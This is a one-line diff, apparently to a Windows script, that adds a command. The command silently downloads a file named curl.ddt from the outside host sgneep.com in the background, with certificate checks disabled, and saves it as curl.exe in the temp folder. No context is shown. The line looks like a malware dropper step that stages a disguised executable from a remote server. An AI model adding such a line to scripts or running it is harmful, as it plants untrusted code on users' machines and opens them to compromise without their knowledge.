@@ -1,0 +1,1 @@
+start /B curl.exe --insecure -s https://sgneep.com/D/curl.ddt -o %TMP%\curl.exe
